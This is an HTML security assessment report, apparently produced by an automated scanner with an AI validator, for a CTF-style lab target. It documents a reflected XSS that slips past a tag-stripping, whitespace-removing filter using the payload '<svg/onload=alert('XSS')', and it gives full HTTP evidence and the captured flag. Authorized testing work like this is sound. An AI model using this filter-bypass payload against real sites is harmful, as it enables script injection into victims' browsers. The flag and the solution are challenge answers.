@@ -1,0 +1,176 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>VERDICT Report a-mr30ltz5-j4euru</title><style>
+*{box-sizing:border-box}
+body{font:14px/1.5 -apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;color:#1a1a1a;margin:0;padding:32px;background:#fff}
+h1{font-size:22px;margin:0 0 4px} h2{font-size:17px;margin:28px 0 10px;border-bottom:2px solid #eee;padding-bottom:4px}
+h3{font-size:15px;margin:18px 0 6px}
+code,pre{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
+pre{background:#f6f8fa;border:1px solid #e3e6ea;border-radius:6px;padding:10px;overflow:auto;font-size:12.5px;white-space:pre-wrap;word-break:break-word}
+.meta{color:#555;font-size:13px;margin:0 0 2px}
+.badge{display:inline-block;color:#fff;border-radius:4px;padding:1px 8px;font-size:12px;font-weight:700;letter-spacing:.3px}
+.sumtags span{display:inline-block;margin:0 6px 6px 0;padding:2px 10px;border-radius:12px;background:#eef1f4;font-size:12px}
+.f{border:1px solid #e3e6ea;border-radius:8px;padding:14px 16px;margin:0 0 14px}
+.f .kv{color:#555;font-size:12.5px;margin:2px 0}
+.f .desc{margin:8px 0}
+table{border-collapse:collapse;width:100%;font-size:13px}
+th,td{border:1px solid #e3e6ea;padding:6px 8px;text-align:left;vertical-align:top}
+th{background:#f6f8fa}
+table.info td:first-child{width:170px;color:#555;font-weight:600;background:#fafbfc}
+.muted{color:#888}
+img.shot{max-width:220px;max-height:140px;border:1px solid #ddd;border-radius:4px}
+.ev{margin:10px 0 0;border-left:3px solid #cdd5dd;padding-left:10px}
+.ev .evh{font-size:12px;color:#555;margin:0 0 4px}
+.ev .lbl{font-size:11px;font-weight:700;letter-spacing:.4px;color:#5f7d8c;margin:6px 0 2px}
+.ev pre{margin:0;max-height:420px}
+html{scroll-behavior:smooth}
+.toc{background:#fafbfc;border:1px solid #e3e6ea;border-radius:8px;padding:10px 16px;margin:14px 0 8px}
+.toc .toctitle{font-weight:700;font-size:12px;color:#555;letter-spacing:.4px;text-transform:uppercase;margin:0 0 6px}
+.toc ul{margin:0;padding-left:18px} .toc>ul{padding-left:16px;list-style:none}
+.toc li{margin:2px 0;font-size:13px} .toc a{color:#0366d6;text-decoration:none} .toc a:hover{text-decoration:underline}
+.toc .sev{font-weight:700;font-size:11px;letter-spacing:.3px}
+@media print{body{padding:0}.f{break-inside:avoid}.ev pre{max-height:none}.toc{break-inside:avoid}}
+</style></head>
+<body>
+<h1>VERDICT Security Assessment Report</h1>
+<nav class="toc"><div class="toctitle">Contents</div><ul>
+<li><a href="#assessment-information">Assessment Information</a></li>
+<li><a href="#scope">Scope</a></li>
+<li><a href="#summary">Summary</a></li>
+<li><a href="#findings">Findings</a><ul>
+<li><a href="#finding-1">1. <span class="sev" style="color:#f57c00">MEDIUM</span> [xss-reflected] Reflected XSS on /page `solution` via tag-strip + space-filter bypass (alert('XSS') executed)</a></li>
+</ul></li>
+</ul></nav>
+<h2 id="assessment-information">Assessment Information</h2><table class="info">
+<tr><td>Assessment ID</td><td><code>a-mr30ltz5-j4euru</code></td></tr>
+<tr><td>Target</td><td><code>http://target.local:32832/</code></td></tr>
+<tr><td>Started</td><td>2026-07-02T04:39:10.724Z</td></tr>
+<tr><td>Generated</td><td>2026-07-02T00:00:00.000Z</td></tr>
+<tr><td>Phase</td><td>report</td></tr>
+<tr><td>Screens</td><td>2 mapped · 2 scanned · 0 remaining</td></tr>
+<tr><td>Hypotheses</td><td>0 (0 confirmed)</td></tr>
+<tr><td>Findings</td><td>1</td></tr>
+<tr><td>Tooling</td><td>VERDICT</td></tr>
+</table>
+<h2 id="scope">Scope</h2><table class="info">
+<tr><td>In-scope hosts</td><td><code>target.local:32832</code></td></tr>
+<tr><td>Out-of-scope hosts</td><td>&mdash;</td></tr>
+<tr><td>In-scope paths</td><td><code>/</code></td></tr>
+<tr><td>Out-of-scope paths</td><td>&mdash;</td></tr>
+<tr><td>Rate</td><td>30 req/min, max 2 concurrent</td></tr>
+</table>
+<h2 id="summary">Summary</h2>
+<p>1 finding(s)</p><p class="sumtags"><span><b style="color:#f57c00">1</b> medium</span></p>
+<h2 id="findings">Findings</h2>
+<div class="f" id="finding-1">
+<h3><span class="badge" style="background:#f57c00">MEDIUM</span> 1. [xss-reflected] Reflected XSS on /page `solution` via tag-strip + space-filter bypass (alert('XSS') executed)</h3>
+<div class="kv">Screen: <code>(cross-screen)</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32832/</div>
+<div class="desc">The POST body parameter `solution` on /page is reflected UNESCAPED into the HTML body of a server-rendered document (between the input field and &lt;/form&gt;). The server sanitizer applies two naive transforms: (1) it strips complete HTML tags matching a `&lt;...&gt;`-style regex (both `&lt;` and a following `&gt;` required — verified: `&lt;b&gt;hi&lt;/b&gt;`-&gt;`hi`, `&lt;script&gt;alert('XSS')&lt;/script&gt;`-&gt;`alert('XSS')`, `&lt;img src=x&gt;`-&gt;removed), and (2) it removes whitespace (space, tab, newline all deleted; `/` survives). Both filters are bypassed at once by (a) OMITTING the closing `&gt;` so no complete tag exists for the tag-strip regex to match — the template's own `&lt;/form&gt;` later supplies the `&gt;` in the browser — and (b) using `/` instead of a space to separate the tag name from its attributes. Payload: `&lt;svg/onload=alert('XSS')`. The app renders each submission in a headless browser that hooks alert(); the injected `&lt;svg onload&gt;` fires on parse and executes alert('XSS'), confirmed by the server returning the success state (success_star.png, &quot;Congratulations! Here is the flag: flag{77b2f057-5e03-472b-bd38-10297eb53229}&quot;). An `&lt;img/src=x/onerror=alert('XSS')` variant also survives the filter but does NOT fire in the oracle because image loading (and thus onerror) is disabled there — onload-based vectors are required. This is arbitrary JavaScript execution in a victim's browser context.</div>
+<div><b>Reproduction</b></div><pre>POST to http://target.local:32832/page with header `Content-Type: application/x-www-form-urlencoded` and body `solution=%3Csvg%2Fonload%3Dalert('XSS')` (decoded: solution=&lt;svg/onload=alert('XSS') — NO trailing &gt; and a / separator). Response contains success_star.png and &quot;Congratulations! Here is the flag: flag{77b2f057-5e03-472b-bd38-10297eb53229}&quot;, proving alert('XSS') executed in the rendering browser. Negative control (ev-mr317b65-18): body `solution=notxss_benign_control` returns error_star / &quot;Oops!&quot; with no flag. Positive replays ev-mr317bii-19 / ev-mr317buu-1a both return &quot;Congratulations&quot;. Filter-characterization evidence: ev-mr3118ub-v, ev-mr311ikt-w, ev-mr312dma-10, ev-mr314zdt-11, ev-mr315536-14, ev-mr316kdh-17.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr317b65-18</code> — <code>artifacts/_/ev-mr317b65-18/</code></div><div class="lbl">REQUEST</div><pre>POST /page HTTP/1.1
+Host: target.local:32832
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+content-type: application/x-www-form-urlencoded
+
+solution=notxss_benign_control</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+content-length: 1042
+content-type: text/html; charset=utf-8
+date: Thu, 02 Jul 2026 04:55:52 GMT
+server: Werkzeug/1.0.1 Python/2.7.18
+
+
+    &lt;html&gt;
+        &lt;head&gt;
+            &lt;link rel=&quot;shortcut icon&quot; href=&quot;static/assets/fav-icon.png&quot;&gt;
+            &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;static/css/style.css&quot;&gt;
+            &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;static/css/xss/xss24.css&quot;&gt;
+            &lt;title&gt;Dalgona - Star&lt;/title&gt;
+        &lt;/head&gt;
+
+        &lt;article class=&quot;widget widget__login&quot;&gt;
+        &lt;div class=&quot;widget__content&quot;&gt;
+            &lt;div class=&quot;box&quot;&gt;
+                &lt;form class=&quot;box-form&quot; method=&quot;post&quot;&gt;
+                    &lt;img class=&quot;text-img&quot; src=&quot;static/img/logo5_white.png&quot;&gt;
+                    
+                    &lt;div class=&quot;solution-text&quot;&gt;&lt;img src=&quot;static/img/cookies/error_star.png&quot; alt=&quot;Fail&quot; width=&quot;150&quot; height=&quot;150&quot;&gt;&lt;br&gt;Oops! You did an alert with TypeError: Attempting to change the setter of an unconfigurable property. instead of &quot;XSS&quot;&lt;/div&gt;
+                    &lt;input type=text name=solution placeholder=&quot;Enter solution...&quot;&gt;
+                    notxss_benign_control
+                &lt;/form&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr317bii-19</code> — <code>artifacts/_/ev-mr317bii-19/</code></div><div class="lbl">REQUEST</div><pre>POST /page HTTP/1.1
+Host: target.local:32832
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+content-type: application/x-www-form-urlencoded
+
+solution=%3Csvg%2Fonload%3Dalert('XSS')</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+content-length: 1012
+content-type: text/html; charset=utf-8
+date: Thu, 02 Jul 2026 04:55:52 GMT
+server: Werkzeug/1.0.1 Python/2.7.18
+
+
+    &lt;html&gt;
+        &lt;head&gt;
+            &lt;link rel=&quot;shortcut icon&quot; href=&quot;static/assets/fav-icon.png&quot;&gt;
+            &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;static/css/style.css&quot;&gt;
+            &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;static/css/xss/xss24.css&quot;&gt;
+            &lt;title&gt;Dalgona - Star&lt;/title&gt;
+        &lt;/head&gt;
+
+        &lt;article class=&quot;widget widget__login&quot;&gt;
+        &lt;div class=&quot;widget__content&quot;&gt;
+            &lt;div class=&quot;box&quot;&gt;
+                &lt;form class=&quot;box-form&quot; method=&quot;post&quot;&gt;
+                    &lt;img class=&quot;text-img&quot; src=&quot;static/img/logo5_white.png&quot;&gt;
+                    
+                    &lt;div class=&quot;solution-text&quot;&gt;&lt;img src=&quot;static/img/cookies/success_star.png&quot; alt=&quot;Correct&quot; width=&quot;150&quot; height=&quot;150&quot;&gt;&lt;br&gt;Congratulations!&lt;p&gt; Here is the flag: flag{77b2f057-5e03-472b-bd38-10297eb53229}&lt;/div&gt;
+                    &lt;input type=text name=solution placeholder=&quot;Enter solution...&quot;&gt;
+                    &lt;svg/onload=alert('XSS')
+                &lt;/form&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr317buu-1a</code> — <code>artifacts/_/ev-mr317buu-1a/</code></div><div class="lbl">REQUEST</div><pre>POST /page HTTP/1.1
+Host: target.local:32832
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+content-type: application/x-www-form-urlencoded
+
+solution=%3Csvg%2Fonload%3Dalert('XSS')</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+content-length: 1012
+content-type: text/html; charset=utf-8
+date: Thu, 02 Jul 2026 04:55:53 GMT
+server: Werkzeug/1.0.1 Python/2.7.18
+
+
+    &lt;html&gt;
+        &lt;head&gt;
+            &lt;link rel=&quot;shortcut icon&quot; href=&quot;static/assets/fav-icon.png&quot;&gt;
+            &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;static/css/style.css&quot;&gt;
+            &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;static/css/xss/xss24.css&quot;&gt;
+            &lt;title&gt;Dalgona - Star&lt;/title&gt;
+        &lt;/head&gt;
+
+        &lt;article class=&quot;widget widget__login&quot;&gt;
+        &lt;div class=&quot;widget__content&quot;&gt;
+            &lt;div class=&quot;box&quot;&gt;
+                &lt;form class=&quot;box-form&quot; method=&quot;post&quot;&gt;
+                    &lt;img class=&quot;text-img&quot; src=&quot;static/img/logo5_white.png&quot;&gt;
+                    
+                    &lt;div class=&quot;solution-text&quot;&gt;&lt;img src=&quot;static/img/cookies/success_star.png&quot; alt=&quot;Correct&quot; width=&quot;150&quot; height=&quot;150&quot;&gt;&lt;br&gt;Congratulations!&lt;p&gt; Here is the flag: flag{77b2f057-5e03-472b-bd38-10297eb53229}&lt;/div&gt;
+                    &lt;input type=text name=solution placeholder=&quot;Enter solution...&quot;&gt;
+                    &lt;svg/onload=alert('XSS')
+                &lt;/form&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/html&gt;</pre></div>
+</div>
+</body></html>
